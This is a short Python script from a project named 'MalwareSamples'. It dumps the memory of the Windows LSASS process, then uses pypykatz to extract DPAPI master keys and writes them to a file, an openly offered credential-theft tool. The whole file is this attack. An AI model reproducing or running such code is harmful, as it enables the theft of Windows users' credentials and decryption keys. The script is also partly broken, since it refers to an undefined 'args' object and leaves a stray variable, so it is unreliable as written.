"""
   Copyright (c) 2019 Jack Farley
   This file is part of MalwareSamples
   Usage or distribution of this software/code is subject to the
   terms of the GNU GENERAL PUBLIC LICENSE.
   user_cred_dump.py
   ---
"""
from pypykatz import pypykatz
from helpers.utilities import findProcessIdByName
from helpers.minidump.createminidump import dump_process_start
from pypykatz.dpapi.dpapi import DPAPI




def createMiniDump(outfile):
    """

    :param outfile: Output file to write to that contains minidump of LSASS process
    :return:
    """
    pid = findProcessIdByName("LSASS.exe")
    dump_process_start(pid, outfile)






def enumerature_user_creds():
    #createMiniDump("F:\\Test_LSASS\\lsass.dmp")
    dpapi = DPAPI()
    dpapi.get_masterkeys_from_lsass_dump("F:\\Test_LSASS\\lsass.dmp")
    dpapi.dump_masterkeys("F:\\Test_LSASS\\masterkey.txt")
    dpapi.decrypt_masterkey_file(args.mkf, bytes.fromhex(args.key))
    x = 0
    #dpapi.dump_masterkeys(args.out_file)








if __name__ == "__main__":
    enumerature_user_creds()

